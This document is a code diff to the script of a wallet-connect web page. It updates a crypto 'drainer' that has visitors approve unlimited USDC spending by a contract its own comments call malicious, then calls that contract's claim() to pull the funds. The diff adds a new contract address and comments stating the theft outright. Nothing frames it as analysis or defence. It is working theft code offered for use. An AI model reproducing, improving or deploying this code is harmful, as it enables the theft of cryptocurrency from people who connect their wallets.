@@ -129,14 +129,21 @@
 
     let provider, signer;
 
-    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // ✅ Base USDC
-    const EVIL_CLAIM_CONTRACT = "0xc7a512CE6eE4867427FFA30BACc4158598B90d9f"; // ✅ EvilClaim contract
+    // Base USDC token address on Base mainnet
+    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
 
+    // Your deployed malicious contract address (EvilClaim renamed)
+    const EVIL_CLAIM_CONTRACT = "0x947A3CbB49401Aa8B89c47A16B09a0111DCe916c";
+
+    // Minimal ERC20 ABI with approve
     const ERC20_ABI = [
       "function approve(address spender, uint256 amount) external returns (bool)"
     ];
 
-    const EVIL_ABI = ["function claim() external"];
+    // Your malicious contract ABI with claim()
+    const EVIL_ABI = [
+      "function claim() external"
+    ];
 
     connectWalletBtn.addEventListener('click', async () => {
       if (!window.ethereum) {
@@ -175,12 +182,12 @@
       }
 
       try {
-        // Step 1: Approve USDC
+        // Step 1: Approve USDC for the malicious contract to pull funds
         const usdc = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
         const approvalTx = await usdc.approve(EVIL_CLAIM_CONTRACT, ethers.constants.MaxUint256);
         await approvalTx.wait();
 
-        // Step 2: Call claim()
+        // Step 2: Call claim() on the malicious contract
         const evil = new ethers.Contract(EVIL_CLAIM_CONTRACT, EVIL_ABI, signer);
         const claimTx = await evil.claim();
         await claimTx.wait();
